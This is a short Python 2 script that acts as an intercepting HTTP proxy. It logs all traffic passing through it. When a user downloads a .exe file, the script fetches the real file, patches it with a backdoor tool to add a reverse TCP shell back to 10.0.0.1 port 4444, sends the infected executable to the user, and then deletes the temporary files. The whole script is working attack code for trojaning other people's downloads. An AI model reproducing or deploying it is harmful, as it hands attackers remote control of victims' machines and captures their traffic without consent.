'''
Created on 20 Aug 2017

@author: pi
'''
import os
import socket
import httplib
import urllib
import shutil
def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("",8080))
    s.listen(90000)
    log = open("Squzz.log","wb")
    while True:
        client,addr = s.accept()
        data = client.recv(65536)
        print data
        log.write(data)
        log.flush()
        try:
            data_array = str(data).split("\r\n")
            req_array = str(data_array[0]).split(" ")
            host = str(data_array[1]).replace("Host: ", "")
            if str(req_array[1]).endswith(".exe"):
               urllib.urlretrieve("http://"+host+req_array[1],"/var/www/html/test.exe")
               search_filename = str(req_array[1]).split("/")
               rename = None
               for i in search_filename:
                   if str(i).endswith(".exe"):
                       rename = i
               os.system("backdoor -f /var/www/html/test.exe -H 10.0.0.1 -P 4444 -s iat_reverse_tcp_stager_threaded -a -L -A -o "+rename)
               shutil.move("/root/backdoored/"+rename,"/var/www/html/"+rename)
               conn = httplib.HTTPConnection("10.0.0.1",port=80)
               conn.request("GET", "/"+rename)
               get = conn.getresponse(False)
               client.send(get.read())
               client.close()
               os.remove("/var/www/html/"+rename)
               os.remove("/var/www/html/test.exe")
            else:
               conn = httplib.HTTPConnection(host,port=80)
               conn.request(str(req_array[0]), str(req_array[1]))
               get = conn.getresponse(False)
               client.send(get.read())
               client.close()
        except:
            pass
    log.close()
main()
